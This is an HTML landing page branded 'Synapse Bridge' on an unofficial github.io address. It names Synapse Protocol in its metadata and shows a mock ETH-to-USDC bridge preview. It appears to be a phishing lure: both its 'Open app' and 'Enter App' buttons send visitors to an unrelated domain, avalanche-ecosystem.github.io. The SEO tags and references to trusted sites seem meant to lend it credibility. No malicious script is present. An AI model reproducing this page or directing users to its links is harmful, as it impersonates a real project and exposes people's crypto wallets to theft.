<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Synapse Bridge</title>
  <meta name="description" content="Synapse Bridge moves assets across chains from your own wallet through Synapse Protocol.">
  <link rel="canonical" href="https://synapse-bridge-site.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#09060F">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Synapse Bridge">
  <meta property="og:description" content="Synapse Bridge moves assets across chains from your own wallet through Synapse Protocol.">
  <meta property="og:url" content="https://synapse-bridge-site.github.io/">
  <meta property="og:image" content="https://synapse-bridge-site.github.io/favicon.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Synapse Bridge">
  <meta name="twitter:description" content="Synapse Bridge moves assets across chains from your own wallet through Synapse Protocol.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://synapse-bridge-site.github.io/#website",
        "url": "https://synapse-bridge-site.github.io/",
        "name": "Synapse Bridge",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://synapse-bridge-site.github.io/#organization",
        "name": "Synapse Protocol",
        "url": "https://www.synapseprotocol.com/",
        "logo": "https://synapse-bridge-site.github.io/favicon.png",
        "sameAs": [
          "https://www.synapseprotocol.com/",
          "https://docs.synapseprotocol.com/",
          "https://github.com/synapsecns",
          "https://twitter.com/SynapseProtocol"
        ]
      },
      {
        "@type": "WebApplication",
        "@id": "https://synapse-bridge-site.github.io/#app",
        "name": "Synapse Bridge",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://synapse-bridge-site.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <div class="brand" aria-label="Synapse Protocol">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Synapse Protocol</span>
    </div>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum Bridges</a>
      <a href="https://docs.synapseprotocol.com/" target="_blank" rel="nofollow noopener noreferrer">Synapse Docs</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Synapse Bridge</h1>
      <p class="value"><strong>Synapse Bridge</strong> moves assets across chains from your own wallet through Synapse Protocol.</p>
    </section>

    <section class="app-card" aria-label="Bridge preview">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="28" height="28" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
          <span aria-hidden="true">&rarr;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="usdc.png" width="28" height="28" alt="USDC">
            <span>USDC</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
      <p class="note">Preview only</p>
    </section>
  </main>

  <footer class="footer">Synapse Bridge &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;

      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
